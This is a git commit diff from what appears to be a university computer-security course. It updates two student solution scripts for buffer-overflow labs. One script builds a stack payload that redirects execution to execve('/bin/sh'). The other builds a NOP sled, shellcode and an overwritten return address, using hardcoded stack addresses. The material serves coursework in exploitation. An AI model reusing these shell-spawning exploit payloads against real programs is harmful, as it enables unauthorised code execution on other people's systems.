28cf883b8ac6238240b398a487b494963dc68112
eecs388 <adwisi@umich.edu>
2024-11-15 21:33:12 +0000

    Automatic commit by test script for adwisi jrosevel

--- sol5.py
+++ sol5.py
@@ -2,27 +2,24 @@
 
 import sys
 
+""""
+execve function call location -> 0x455050
+overwrite a, b, c
+redirect end of vulnerable to execve
 
-#bin sh in hex, need value to overwrite to stack etc.:
-bin_sh = (
-    b'\x00\x00' +                   
-    b'/bin/sh\x00'                 
-)
-#null arguments are in RDI and RSI registers with value 0, this is for NULL arguments of excev
+   0x0000000000401e68 <+40>:    mov    rdx,QWORD PTR [rbp-0x18]
+   0x0000000000401e6c <+44>:    mov    rcx,QWORD PTR [rbp-0x10]
+   0x0000000000401e70 <+48>:    mov    rax,QWORD PTR [rbp-0x8]
+"""
+
+bin_sh_str = (0x0068732f6e69622f).to_bytes(8, 'little') + (b'\x00'*2)
+a = (0x7ffffff68fae).to_bytes(8, 'little')
+b = (0x7ffffff68fc8).to_bytes(8, 'little')
+c = (0x0000000000401e21).to_bytes(8, 'little')
+
 null_rdi = (0).to_bytes(8, 'little')
 null_rsi = (0).to_bytes(8, 'little')
 
-#Address for for bin/sh in memory: 
-bin_addr = (0x7ffffff68fae).to_bytes(8, 'little')
-#address for executing ROP gadget to call exec
-rbp = (0x7ffffff68fae).to_bytes(8, 'little')
-execv_addr = (0x455050).to_bytes(8, 'little')
+payload = bin_sh_str + null_rdi + null_rsi + a + b + c
 
-addresses = (
-    bin_addr +
-    rbp + 
-    execv_addr
-)
-
-hacking = bin_sh + null_rdi + null_rsi + addresses
-sys.stdout.buffer.write(hacking)
+sys.stdout.buffer.write(payload)
--- sol6.py
+++ sol6.py
@@ -4,19 +4,9 @@ import sys
 
 from shellcode import shellcode
 
-buffer_size = 112
+noop_sled = b'\x90'*970
+filler = b'A' * 8
 
-nop_sled_size = 64
-nop_sled = b'\x90' * nop_sled_size
-
-payload = nop_sled + shellcode
-
-# Padding to reach the saved return address, if needed
-padding_size = buffer_size - len(nop_sled) - len(shellcode)
-if padding_size > 0:
-    payload += b'A' * padding_size
-
-buffer_addr = 0x7ffffff68b60
-payload += buffer_addr.to_bytes(8, 'little')
-
-sys.stdout.buffer.write(payload)
+hacking = noop_sled + shellcode + filler
+return_addr = 0x7ffffff68c00.to_bytes(8, 'little')
+sys.stdout.buffer.write(hacking + return_addr)
